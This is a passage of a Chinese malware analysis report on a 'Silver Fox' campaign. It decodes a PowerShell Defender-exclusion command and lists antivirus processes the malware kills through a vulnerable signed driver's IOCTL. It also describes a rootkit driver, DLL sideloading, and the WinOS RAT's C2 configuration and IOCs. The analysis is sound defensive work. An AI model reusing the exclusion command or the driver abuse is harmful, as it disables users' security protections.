        call STRFROMCODE
        pop ; StackCount = 7
        pop ; StackCount = 6
        add Var5, Var6
        pop ; StackCount = 5
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype Type30 ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype S32 ; StackCount = 9
        assign Var9, S32(1)
        pushvar Var8 ; StackCount = 10
        call SETARRAYLENGTH
        pop ; StackCount = 9
        pop ; StackCount = 8
        assign Var8[0], S32(39)
        assign Var7, Var8
        pop ; StackCount = 7
        pushvar Var6 ; StackCount = 8
        call STRFROMCODE
        pop ; StackCount = 7
        pop ; StackCount = 6
        add Var5, Var6
        pop ; StackCount = 5
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype Type30 ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype S32 ; StackCount = 9
        assign Var9, S32(1)
        pushvar Var8 ; StackCount = 10
        call SETARRAYLENGTH
        pop ; StackCount = 9
        pop ; StackCount = 8
        assign Var8[0], S32(44)
        assign Var7, Var8
        pop ; StackCount = 7
        pushvar Var6 ; StackCount = 8
        call STRFROMCODE
        pop ; StackCount = 7
        pop ; StackCount = 6
        add Var5, Var6
        pop ; StackCount = 5
        assign Var4, Var5
        pop ; StackCount = 4
        pushtype WideString ; StackCount = 5
        assign Var5, Var4
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype Type30 ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype S32 ; StackCount = 9
        assign Var9, S32(1)
        pushvar Var8 ; StackCount = 10
        call SETARRAYLENGTH
        pop ; StackCount = 9
        pop ; StackCount = 8
        assign Var8[0], S32(32)
        assign Var7, Var8
        pop ; StackCount = 7
        pushvar Var6 ; StackCount = 8
        call STRFROMCODE
        pop ; StackCount = 7
        pop ; StackCount = 6
        add Var5, Var6
        pop ; StackCount = 5
        assign Var4, Var5
        pop ; StackCount = 4
        pushtype WideString ; StackCount = 5
        assign Var5, Var4
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype Type30 ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype S32 ; StackCount = 9
        assign Var9, S32(1)
        pushvar Var8 ; StackCount = 10
        call SETARRAYLENGTH
        pop ; StackCount = 9
        pop ; StackCount = 8
        assign Var8[0], S32(39)
        assign Var7, Var8
        pop ; StackCount = 7
        pushvar Var6 ; StackCount = 8
        call STRFROMCODE
        pop ; StackCount = 7
        pop ; StackCount = 6
        add Var5, Var6
        pop ; StackCount = 5
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype Type30 ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype S32 ; StackCount = 9
        assign Var9, S32(13)
        pushvar Var8 ; StackCount = 10
        call SETARRAYLENGTH
        pop ; StackCount = 9
        pop ; StackCount = 8
        assign Var8[0], S32(67)
        assign Var8[1], S32(58)
        assign Var8[2], S32(92)
        assign Var8[3], S32(67)
        assign Var8[4], S32(110)
        assign Var8[5], S32(100)
        assign Var8[6], S32(111)
        assign Var8[7], S32(109)
        assign Var8[8], S32(54)
        assign Var8[9], S32(46)
        assign Var8[10], S32(115)
        assign Var8[11], S32(121)
        assign Var8[12], S32(115)
        assign Var7, Var8
        pop ; StackCount = 7
        pushvar Var6 ; StackCount = 8
        call STRFROMCODE
        pop ; StackCount = 7
        pop ; StackCount = 6
        add Var5, Var6
        pop ; StackCount = 5
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype Type30 ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype S32 ; StackCount = 9
        assign Var9, S32(1)
        pushvar Var8 ; StackCount = 10
        call SETARRAYLENGTH
        pop ; StackCount = 9
        pop ; StackCount = 8
        assign Var8[0], S32(39)
        assign Var7, Var8
        pop ; StackCount = 7
        pushvar Var6 ; StackCount = 8
        call STRFROMCODE
        pop ; StackCount = 7
        pop ; StackCount = 6
        add Var5, Var6
        pop ; StackCount = 5
        pushtype UnicodeString_2 ; StackCount = 6
        pushtype Type30 ; StackCount = 7
        pushtype Type30 ; StackCount = 8
        pushtype S32 ; StackCount = 9
        assign Var9, S32(1)
        pushvar Var8 ; StackCount = 10
        call SETARRAYLENGTH
        pop ; StackCount = 9
        pop ; StackCount = 8
        assign Var8[0], S32(34)
        assign Var7, Var8
        pop ; StackCount = 7
        pushvar Var6 ; StackCount = 8
        call STRFROMCODE
        pop ; StackCount = 7
        pop ; StackCount = 6
        add Var5, Var6
        pop ; StackCount = 5
        assign Var4, Var5
        pop ; StackCount = 4
        pushtype BOOLEAN ; StackCount = 5
        pushtype Pointer ; StackCount = 6
        setptr Var6, Var1
        pushtype U8_4 ; StackCount = 7
        assign Var7, U8_4(1)
        pushtype S32 ; StackCount = 8
        assign Var8, S32(0)
        pushtype UnicodeString_2 ; StackCount = 9
        assign Var9, String_3("")
        pushtype UnicodeString_2 ; StackCount = 10
        pushtype WideString ; StackCount = 11
        assign Var11, Var3
        pushtype UnicodeString_2 ; StackCount = 12
        pushtype Type30 ; StackCount = 13
        pushtype Type30 ; StackCount = 14
        pushtype S32 ; StackCount = 15
        assign Var15, S32(1)
        pushvar Var14 ; StackCount = 16
        call SETARRAYLENGTH
        pop ; StackCount = 15
        pop ; StackCount = 14
        assign Var14[0], S32(32)
        assign Var13, Var14
        pop ; StackCount = 13
        pushvar Var12 ; StackCount = 14
        call STRFROMCODE
        pop ; StackCount = 13
        pop ; StackCount = 12
        add Var11, Var12
        pop ; StackCount = 11
        add Var11, Var4
        assign Var10, Var11
        pop ; StackCount = 10
        pushtype UnicodeString_2 ; StackCount = 11
        assign Var11, Var2
        pushvar Var5 ; StackCount = 12
        call EXEC
        pop ; StackCount = 11
        pop ; StackCount = 10
        pop ; StackCount = 9
        pop ; StackCount = 8
        pop ; StackCount = 7
        pop ; StackCount = 6
        pop ; StackCount = 5
        pop ; StackCount = 4
        pushtype S32 ; StackCount = 5
        assign Var5, S32(4000)
        call SLEEP
        pop ; StackCount = 4
loc_ead:
        ret
```
以下是所有ASCII码数组的还原结果：

1. 第一个数组（14字节）
ASCII码：112, 111, 119, 101, 114, 115, 104, 101, 108, 108, 46, 101, 120, 101
字符串："powershell.exe"

2. 第二个数组（8字节）
ASCII码：45, 67, 111, 109, 109, 97, 110, 100
字符串："-Command"

3. 第三个数组（1字节）
ASCII码：34
字符串："\""

4. 第四个数组（16字节）
ASCII码：65, 100, 100, 45, 77, 112, 80, 114, 101, 102, 101, 114, 101, 110, 99, 101
字符串："Add-MpPreference"

5. 第五个数组（1字节）
ASCII码：32
字符串：" "

6. 第六个数组（14字节）
ASCII码：45, 69, 120, 99, 108, 117, 115, 105, 111, 110, 80, 97, 116, 104
字符串："-ExclusionPath"

7. 第七个数组（1字节）
ASCII码：32
字符串：" "

8. 第八个数组（1字节）
ASCII码：39
字符串："'"

9. 第九个数组（25字节）
ASCII码：67, 58, 92, 85, 115, 101, 114, 115, 92, 80, 117, 98, 108, 105, 99, 92, 68, 111, 99, 117, 109, 101, 110, 116, 115
字符串："C:\Users\Public\Documents"

10. 第十个数组（1字节）
ASCII码：39
字符串："'"

11. 第十一个数组（1字节）
ASCII码：44
字符串：","

12. 第十二个数组（1字节）
ASCII码：32
字符串：" "

13. 第十三个数组（1字节）
ASCII码：39
字符串："'"

14. 第十四个数组（13字节）
ASCII码：67, 58, 92, 67, 110, 100, 111, 109, 54, 46, 115, 121, 115
字符串："C:\Cndom6.sys"

15. 第十五个数组（1字节）
ASCII码：39
字符串："'"

16. 第十六个数组（1字节）
ASCII码：34
字符串："\""

17. 第十七个数组（1字节）
ASCII码：32
字符串：" "

这个函数在Windows Defender运行时，向Windows Defender排除列表添加两个路径：
`C:\Users\Public\Documents`
`C:\Cndom6.sys`
最终执行的PowerShell命令：`powershell.exe -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents','C:\Cndom6.sys'"`
这允许恶意软件在排除路径中运行而不被Windows Defender检测，是常见的恶意软件规避技术。函数会先调用"ISDEFENDERRUNNING"函数检查Defender是否运行（即MsMpEng.exe进程是否存在），只有在运行的情况下才会添加排除项。
本地实测，当Windows Defender运行（即MsMpEng.exe进程存在）后执行样本成功复现该行为，反之无此行为，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163140wq444su22uun2s22.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163157rx3axgh7babg17bb.png)

## B.) men.exe
SHA-256: 305a1c784db4e88267f1d35b914b6ce4702f2b1196c1cdf14c024d63d1d4871f
该程序使用Themida保护器加壳，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163305p2sl9qsg6460tgmi.png)

men.exe启动后会拉起C:\Users\Public\Documents\funzip.exe，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163316lypzyppgyghna48m.png)

拉起的funzip.exe进程命令行为: C:\Users\Public\Documents\funzip.exe x "C:\Users\Public\Documents\x86-Microsoft-Windowsdata\tree.exe" -pServer8888 -o"C:\Users\Public\Documents\x86-Microsoft-Windowsdata" -y，即将tree.exe解压至x86-Microsoft-Windowsdata目录下，解压密码为"Server8888"，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163326t69n5gnix6xflufl.png)

根据文件头信息 tree.exe实际为Zip加密压缩包，解压后可得到: KANG.exe Shell.log，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163343xpyyenky8qayzq98.png)

（根据文件头信息 Shell.log实际也为Zip加密压缩包，解压密码也为"Server8888"，解压后可得到: StartMenuExperienceHostker.exe WUDFCompanionHoste.exe log.dll，我们将在下文中进行分析）

men.exe拉起funzip.exe解压加密Zip压缩包tree.exe，创建、释放KANG.exe，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163358gno00ednq0i9m5ln.png)

随后men.exe会寻找判断KANG.exe是否已经启动，并不断拉起KANG.exe，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163410rd4fa5xata9zq7sz.png)

同时，观察到men.exe会尝试注入可读可执行内存至svchost.exe进程中，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163437dr1o6p0gzmz1ncgq.png)

随后，men.exe会释放并加载C:\Cndom6.sys驱动（SHA-256: 8c12407a40eab287a8281be64665b1e72b0e91b2daf84030a1a15dc280e5dbf1; 签名者: "Beijing Tianshui Technology Co., Ltd."），如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163601ingbpbz77j78ijnn.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163626jxknctkcr9mx4n5i.jpg)

该驱动使用InfinityHook技术实现系统内核API Hook，对于该驱动的分析将放在下文对于StartMenuExperienceHostker.exe的分析中。


## C.) KANG.exe
SHA-256: 9ace6a1e4bee5834be38b4c2fd26780d1fcc18ea9d58224e31d6382c19e53296

首先我们在样本的主功能入口函数中看到，在Line 34-83，样本初始化v23这个列表，定义了25个后续需要终止的安全软件进程，主要包括：
360系列（主要包括360安全卫士、360杀毒、360急救箱、360 Total Security等产品）：
ZhuDongFangYu.exe、360tray.exe、360sd.exe、360rp.exe、360Tray.exe、
360Safe.exe、360rps.exe、SuperKillller.exe、QHActiveDefense.exe、QHSafeTray.exe
腾讯电脑管家：QMDL.exe、QMPersonalCenter.exe、QQPCPatch.exe、QQPCRealTimeSpeedup.exe、QQPCRTP.exe、QQPCTray.exe、QQRepair.exe
金山毒霸：kxescore.exe、kxecenter.exe
火绒互联网安全软件：HipsMain.exe、HipsTray.exe、HipsDaemon.exe
联想电脑管家：LenovoTray.exe、LAVService.exe
Windows Defender：MsMpEng.exe

随后，我们看到样本在Line 85从sub_14004BF20函数处获取到了一个设备句柄
然后不断遍历进程、获取指定进程PID (th32ProcessID、v16为进程PID指针)，在Line 111通过DeviceIoControl向该设备发送控制码0xB822200C与进程PID(&v16)

如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163717h4x9dy5x1u1ux8z5.png)

我们进入sub_14004BF20函数，发现该函数在Line 62处理来自&unk_140029490的35400字节的数据(驱动程序文件)，在Line 64调用sub_14004C6D0函数加载驱动程序，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163726vvvom99gmfizygzl.png)

来自&unk_140029490的35400字节的数据(驱动程序文件)，具有MZ头和PE头，确认为样本实际释放和加载的STProcessMonitor Driver驱动程序(SHA-256: 70bcec00c215fe52779700f74e9bd669ff836f594df92381cbfb7ee0568e7a8b)，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163737knp9552v3i52p2vg.png)

本地实测，成功复现该加驱行为，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163831ot4x3md3dqhaadw3.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163856b9zmcfb4b7gbbcc7.jpg)

该驱动通过了WHQL认证，具有"Safetica Technologies s.r.o."与"Microsoft Windows Hardware Compatibility Publisher"颁发的数字签名，签名时间为‎2025‎年‎5‎月‎9‎日 11:43:46，相当新鲜，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163920yxqxguf2vxvxxezv.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163926obbi00zsq0u3oqqb.png)

sub_14004C6D0函数负责在注册表驱动/服务项中注册、加载驱动程序，相关注册表操作代码和字符串 如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163940jfbzef46q5ft6tf1.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/163946x3s6xl56qs5vij61.png)

然后，我们回头来看KANG.exe给STProcessMonitor Driver的"\\\\.\\STProcessMonitorDriver"设备发送的IOCTL 0xB822200C：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164006c3omy233tu2cqzzs.png)
我们接下来查看在STProcessMonitor Driver中，IOCTL 0xB822200C对应的功能，对STProcessMonitor Driver进行分析。


STProcessMonitor Driver驱动程序首先检查操作系统版本，如果系统是Windows 8（版本6.2）或更高版本，则设置特定的内存池类型和标志。
随后，驱动程序调用IoCreateDevice创建一个名为"\\Device\\STProcessMonitorDriver"的设备对象，接着调用IoCreateSymbolicLink建立符号链接"\\DosDevices\\STProcessMonitorDriver"，这样用户态应用程序就可以通过以上设备对象或链接名称访问该驱动设备。
然后是关键IRP：
```
      DriverObject->MajorFunction[2] = (PDRIVER_DISPATCH)&sub_140001A10;
      DriverObject->MajorFunction[0] = (PDRIVER_DISPATCH)&sub_140001A10;
      DriverObject->MajorFunction[14] = (PDRIVER_DISPATCH)&sub_140001B70;
      DriverObject->DriverUnload = (PDRIVER_UNLOAD)sub_1400021F0;
```
驱动程序设置了关键IRP（I/O请求包）的派遣函数：
IRP_MJ_CREATE（0）：处理打开设备的请求。
IRP_MJ_CLOSE（2）：处理关闭设备的请求。
IRP_MJ_DEVICE_CONTROL（14）：处理设备控制操作（IOCTL），这是用户态与内核态驱动通信的主要方式。
同时，设置了DriverUnload例程，以便在驱动卸载时清理资源。
如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164027crijj7lijchffifs.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164044x6idax31vav13nn3.jpg)

因此，我们应进入sub_140001B70查看。

在sub_140001B70中，我们看到case 0xB822200C的主要操作为：打开进程/获取进程句柄=>结束进程=>关闭/释放进程句柄，其主要功能为终止、结束进程，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164057w52suqqqq8q6qjc8.png)

该驱动程序在没有经过目标验证的情况下，将结束进程功能的IOCTL暴露给用户模式，使攻击者能够终止内核模式中的任意进程。
在样本发现时，在VirusTotal上该脆弱驱动程序尚未被安全产品标记，截至本文撰稿前被一家安全产品标记，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164120gzkh5kdkbdkpdklu.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164135u200bu00t5itwlpf.png)

来自VirusTotal Relations的信息表明相关驱动至今仍有被分发的迹象，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164155zxkkohtzp66sxkvh.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164201fcwxbkciuislcl4o.jpg)
------
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164208xvkxxn2tuvtxvvnz.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164214skcr0aqiri4hqddu.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164219pngroynymysyrnjc.png)


本次使用的STProcessMonitor Driver在先前并未使用过。同时，鉴于该驱动在互联网、开源仓库、漏洞数据库中均未找到相关记录，且来自VirusTotal Relations的信息表明相关驱动至今仍有被分发的迹象，即相关驱动目前可能仍在被使用、分发，我们将其提交至CVE漏洞数据库并分配编号CVE-2025-70795。这表明该批银狐行为者可能会在真实世界中主动搜寻和挖掘全新的漏洞驱动。


将KANG.exe与STProcessMonitor Driver的IOCTL 0xB822200C控制码发送过程直观地合影留念，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164233fh2o3st3sqht32h6.png)


## D.) StartMenuExperienceHostker.exe
SHA-256: cf111e28e40d20c9695e191c66b11882049c9559d5b4f2ed2090cf4626fdba39
我们从StartMenuExperienceHostker.exe的StartAddress函数中观察到其主要实现两个功能：
1. 用于启动WUDFCompanionHoste.exe
2. 用于释放并加载C:\Cndom6.sys驱动，以使用InfinityHook技术实现系统内核API Hook

具体如下：
i) 用于启动和重启动WUDFCompanionHoste.exe
样本首先不断循环遍历进程（的szExeFile），寻找byte_841CD0中的值(即"WUDFCompanionHoste.exe")，获取"WUDFCompanionHoste.exe"进程PID (th32ProcessID为进程PID指针)，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164308bh0hsshithlb2lil.png)

随后先调用sub_843220(th32ProcessID)，通过SuspendThread(Win32 API)函数挂起其进程中的所有线程（下方还有错误处理未展示：如果线程挂起失败或原本已被挂起，则立即恢复线程原先状态，避免重复挂起），如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164319znwk8kny8kgde8rk.png)

然后再调用sub_8432F0(th32ProcessID)，通过GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeProcess")方式从ntdll.dll中动态获取NtResumeProcess(NT API)函数，如果成功则调用NtResumeProcess函数恢复其进程中的所有线程，之后再次尝试通过ResumeThread(Win32 API)函数恢复其进程中的所有线程，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164326c2hy0maefh3rmm11.png)

完成上述步骤后，将WUDFCompanionHoste.exe文件路径赋给CmdLine，使用WinExec(CmdLine, 0)重新再次启动WUDFCompanionHoste.exe，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164336dw037sc0llelylze.png)

ii) 用于释放并加载C:\Cndom6.sys驱动，以使用InfinityHook技术实现系统内核API Hook
创建驱动/服务项（ServiceName="Cndom6"; BinaryPath="C:\\Cndom6.sys"）、打开设备"\\\\.\\Cndom6"，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164355zf0a0fim03imfv9f.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164403spo42gu4ugkukgzk.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164408qw518lw49fi4960j.png)

本地实测，成功复现该加驱行为，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164442ebb3obixo5tk353t.jpg)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164507b2agfv5pvokpp5xa.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164555axxwyfwzuzqyqy5v.jpg)

随后，样本尝试向该驱动的设备发送IOCTL 0x222180控制码，如果失败再继续发送IOCTL 0x229390控制码，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164611seyewai95yd2yadd.png)


我们接下来查看在Cndom6中，IOCTL 0x222180对应的功能，对Cndom6进行分析。

首先，进入DriverEntry，驱动程序调用IoCreateDevice创建一个名为"\\Device\\Cndom6"的设备对象，接着调用IoCreateSymbolicLink建立符号链接"\\??\\Cndom6"，这样用户态应用程序就可以通过以上设备对象或链接名称访问该驱动设备。
然后是关键IRP：
```
      DriverObject->MajorFunction[2] = (PDRIVER_DISPATCH)&sub_140003A9C;
      DriverObject->MajorFunction[0] = (PDRIVER_DISPATCH)&sub_140003A9C;
      DriverObject->MajorFunction[14] = (PDRIVER_DISPATCH)&sub_14000338C;
```
驱动程序设置了关键IRP（I/O请求包）的派遣函数：
IRP_MJ_CREATE（0）：处理打开设备的请求。
IRP_MJ_CLOSE（2）：处理关闭设备的请求。
IRP_MJ_DEVICE_CONTROL（14）：处理设备控制操作（IOCTL），这是用户态与内核态驱动通信的主要方式。
如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164625s4omzfov3fb5gg4v.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164632ene9yv3g99ibffyb.jpg)

因此，我们应进入sub_14000338C查看。

在sub_14000338C中，我们看到case 0x222180的主要操作是将byte_140072AED标志位设置为1，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164655x9fiheynd39jkyhp.png)
我们查看该标志位的交叉引用，发现有函数会在判断该标志位是否有效后，动态替换函数指针实现系统内核函数Hook，可能用于处理KeGetCurrentThread，用于执行线程隐藏或保护线程执行信息，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164726q9drb81d918r51bu.png)

重新回头看该驱动具备的其他功能，从DriverEntry=>if ( sub_140001A10() )=>if ( ... && sub_14000202C() )中，发现该驱动通过调用sub_140004A3C函数获取NtTraceControl、KeQueryPerformanceCounter、NtQuerySystemInformation、NtOpenProcess、NtOpenThread等内核API地址，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164731spomjpchjmmll1jo.png)
以NtQuerySystemInformation为例，查找qword_140007338的交叉引用，找到针对NtQuerySystemInformation API的Hook函数sub_140003FC4，用于执行进程隐藏，功能开关标志位为dword_140007398，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164909qdza6gz5jmsrejbb.jpg)
通过交叉引用查找到dword_140007398标志位由IOCTL 0x22218C控制（本次样本未发送），由sub_140004D1C进行赋值，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164932bef1jja8fcfavcwe.jpg)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/164942x42mx9kzkfkrr6xf.jpg)

同理，以NtOpenProcess为例，查找qword_140007340的交叉引用，找到针对NtOpenProcess API的Hook函数sub_140003F40，用于执行进程句柄保护，功能开关标志位为dword_140041D78，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/165005r19nlq2qtn44qjtr.jpg)
通过交叉引用查找到dword_140041D78标志位由IOCTL 0x222190控制（本次样本未发送），由sub_140004C68进行赋值，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/165040fh5gaxxiaipaihaw.jpg)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/165050i6v3nvmplc1zel36.jpg)

触发Hook NtQuerySystemInformation、NtOpenProcess、 NtDuplicateObject API的调用器（启动器）函数sub_140001940，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/165103ymrfmhhm50m8j38f.jpg)


** 同时，我们发现，样本完整运行后，StartMenuExperienceHostker.exe会被添加至计划任务启动项中，计划任务名称: "WindowsPowerShell.WbemScripting.WindowsData"，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/165121ktci15tbtllm7ow1.png)
且样本会更改其对应计划任务xml文件C:\Windows\System32\Tasks\WindowsPowerShell.WbemScripting.WindowsData对象的DACL，导致系统在尝试删除该条计划任务时，因权限不足无法删除此条计划任务，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/165131zcueouscgcmb3epo.png)
具体原因为，在删除计划任务时，实际执行者svchost.exe在删除该计划任务xml文件时抛出拒绝访问错误(ACCESS_DENIED)，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/165141m8pvdj4d6ov4vc8o.png)
恢复其对应计划任务xml文件的DACL后即可正常删除该计划任务。


## E.) WUDFCompanionHoste.exe=>log.dll
log.dll SHA-256: a14b681ec50328d3ac04f76ac18ef96fb7176425ff96325e2099ea57df3a1998
这是一组dll劫持/dll侧载/白加黑，WUDFCompanionHoste.exe启动后会尝试加载log.dll中的代码，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/165159iskkq6eskvqtvp7q.png)

WUDFCompanionHoste.exe实际上是加载log.dll中的GenericLogImpl导出函数：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/165214a2iw1bb3vz846bwc.jpg)

其会先读取Server.log文件，使用密钥"??Bid@locale@std"通过RC4解密，解密后执行WinOs远控模块，相关代码如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/165222kbgzlxb611ho35b5.jpg)

WinOs远控模块执行后，连接远程服务器实现远控逻辑，后续长期驻留和进行信息窃取。”WinOS“远控上线配置如下：
|p1:uuuucome.com|o1:5050|t1:1|p2:uuuucome.com|o2:5050|t2:1|p3:uuuucome.com|o3:5050|t3:1|dd:1|cl:1|fz:网站|bb:2025.11.20|bz:2025.11.20|jp:1|bh:0|ll:0|dl:0|sh:0|kl:0|bd:0|
如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/165239hi89enmiym62ne91.png)
从中我们可以看到，最终WinOs远控载荷于2025年11月20日生成。
木马C2: uuuucome.com:5050 (解析IP: 8.210.25.225:5050)，如下图所示：
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/165248jlapnltpkksjmt90.png)
![](https://bbs.huorong.cn/data/attachment/forum/202602/11/165253z88lahgv8lrlh885.jpg)

# 三、附录
**Ioc**
**C2:** uuuucome.com:5050 (解析IP: 8.210.25.225:5050)
**SHA-256:**
3ba89047b9fb9ae2281e06a7f10a407698174b201f28fc1cadb930207254e485
305a1c784db4e88267f1d35b914b6ce4702f2b1196c1cdf14c024d63d1d4871f
8c12407a40eab287a8281be64665b1e72b0e91b2daf84030a1a15dc280e5dbf1
9ace6a1e4bee5834be38b4c2fd26780d1fcc18ea9d58224e31d6382c19e53296
70bcec00c215fe52779700f74e9bd669ff836f594df92381cbfb7ee0568e7a8b
cf111e28e40d20c9695e191c66b11882049c9559d5b4f2ed2090cf4626fdba39
a14b681ec50328d3ac04f76ac18ef96fb7176425ff96325e2099ea57df3a1998


Update: 
我们找到了STProcessMonitor的新驱动 (SHA256: 5B4F59236A9B950BCD5191B35D19125F60CFB9E1A1E1AA2E4F914B6745DDE9DF)与旧版驱动对比后可以发现，其创建了一个ACL，给SeAliasAdminsSid降权，只允许SeLocalSystemSid执行高权限操作：
![](https://bbs.huorong.cn/data/attachment/forum/202602/12/160815ga3gxzxoas6zza1t.jpg)
![](https://bbs.huorong.cn/data/attachment/forum/202602/12/160823h24h82bn2by41qhl.jpg)
![](https://bbs.huorong.cn/data/attachment/forum/202602/12/160828pexqmdu5a8h05i6i.png)
工作原理和旧版完全一样——唯一的区别是现在需要SYSTEM令牌。
该新驱动其实也能利用，不过需要调用者提权至NT AUTHORITY\SYSTEM令牌——获得NT AUTHORITY\SYSTEM令牌后才可执行高权限操作，在一定程度上增大了利用难度，但如果恶意行为者通过其他方式在用户层提权至SYSTEM权限，取得NT AUTHORITY\SYSTEM令牌，则仍然可以被用来结束没有受PPL保护的防病毒产品进程。
提权至SYSTEM令牌后，发送IOCTL 0xB822A00C，就可以利用了：
![](https://bbs.huorong.cn/data/attachment/forum/202602/12/160837n65ann8pjztmh6sf.jpg)
